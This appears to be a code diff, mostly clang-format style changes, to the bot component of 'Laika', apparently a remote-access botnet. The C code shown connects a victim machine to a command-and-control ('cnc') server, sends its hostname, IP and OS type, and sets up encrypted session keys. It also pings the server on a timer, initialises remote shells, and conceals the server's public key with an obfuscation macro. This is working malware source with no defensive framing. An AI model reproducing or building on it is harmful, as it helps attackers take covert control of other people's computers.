@@ -1,19 +1,23 @@
+#include "bot.h"
+
+#include "lbox.h"
+#include "lerror.h"
 #include "lmem.h"
 #include "lsodium.h"
-#include "lerror.h"
-#include "lbox.h"
-#include "bot.h"
 #include "shell.h"
 
-void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
+void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
+    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
     uint8_t endianness = laikaS_readByte(&peer->sock);
 
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
-    LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n", (endianness ? "TRUE" : "FALSE"));
+    LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n",
+                (endianness ? "TRUE" : "FALSE"));
 }
 
-void laikaB_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void laikaB_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     LAIKA_DEBUG("got ping from cnc!\n");
     /* stubbed */
 }
@@ -48,17 +52,19 @@ struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
 /* clang-format on */
 
 /* socket event */
-void laikaB_onPollFail(struct sLaika_socket *sock, void *uData) {
-    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
-    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
+void laikaB_onPollFail(struct sLaika_socket *sock, void *uData)
+{
+    struct sLaika_peer *peer = (struct sLaika_peer *)sock;
+    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
 
     laikaS_kill(&bot->peer->sock);
 }
 
 /* ==========================================[[ Bot ]]========================================== */
 
-struct sLaika_bot *laikaB_newBot(void) {
-    LAIKA_BOX_SKID_START(char*, cncPubKey, LAIKA_PUBKEY);
+struct sLaika_bot *laikaB_newBot(void)
+{
+    LAIKA_BOX_SKID_START(char *, cncPubKey, LAIKA_PUBKEY);
     struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
     struct hostent *host;
     char *tempINBuf;
@@ -66,16 +72,11 @@ struct sLaika_bot *laikaB_newBot(void) {
     int i;
 
     laikaP_initPList(&bot->pList);
-    bot->peer = laikaS_newPeer(
-        laikaB_pktTbl,
-        &bot->pList,
-        laikaB_onPollFail,
-        (void*)bot,
-        (void*)bot
-    );
+    bot->peer =
+        laikaS_newPeer(laikaB_pktTbl, &bot->pList, laikaB_onPollFail, (void *)bot, (void *)bot);
 
     laikaT_initTaskService(&bot->tService);
-    laikaT_newTask(&bot->tService, 5000, laikaB_pingTask, (void*)bot);
+    laikaT_newTask(&bot->tService, 5000, laikaB_pingTask, (void *)bot);
 
     /* init shells */
     for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
@@ -112,7 +113,7 @@ struct sLaika_bot *laikaB_newBot(void) {
         LAIKA_ERROR("gethostbyname() failed!\n");
     }
 
-    if ((tempINBuf = inet_ntoa(*((struct in_addr*)host->h_addr_list[0]))) == NULL) {
+    if ((tempINBuf = inet_ntoa(*((struct in_addr *)host->h_addr_list[0]))) == NULL) {
         laikaB_freeBot(bot);
         LAIKA_ERROR("inet_ntoa() failed!\n");
     }
@@ -123,7 +124,8 @@ struct sLaika_bot *laikaB_newBot(void) {
     return bot;
 }
 
-void laikaB_freeBot(struct sLaika_bot *bot) {
+void laikaB_freeBot(struct sLaika_bot *bot)
+{
     int i;
 
     /* clear shells */
@@ -138,7 +140,8 @@ void laikaB_freeBot(struct sLaika_bot *bot) {
     laikaM_free(bot);
 }
 
-void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
+void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port)
+{
     struct sLaika_socket *sock = &bot->peer->sock;
 
     /* setup socket */
@@ -153,17 +156,23 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
     laikaS_writeByte(sock, LAIKA_OSTYPE);
-    laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
+
+    /* write public key */
+    laikaS_write(sock, bot->pub, sizeof(bot->pub));
     laikaS_write(sock, bot->peer->hostname, LAIKA_HOSTNAME_LEN);
     laikaS_write(sock, bot->peer->inet, LAIKA_INET_LEN);
     laikaS_endOutPacket(bot->peer);
-    laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */
 
-    if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
+    /* after the cnc receives our handshake, our packets will be encrypted */
+    laikaS_setSecure(bot->peer, true);
+
+    if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv,
+                                      bot->peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n");
 }
 
-bool laikaB_poll(struct sLaika_bot *bot) {
+bool laikaB_poll(struct sLaika_bot *bot)
+{
     struct sLaika_pollEvent *evnt;
     int numEvents;
 
@@ -184,8 +193,10 @@ bool laikaB_poll(struct sLaika_bot *bot) {
     return true;
 }
 
-void laikaB_pingTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
-    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
+void laikaB_pingTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick,
+                     void *uData)
+{
+    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
 
     laikaS_emptyOutPacket(bot->peer, LAIKAPKT_PINGPONG);
 }
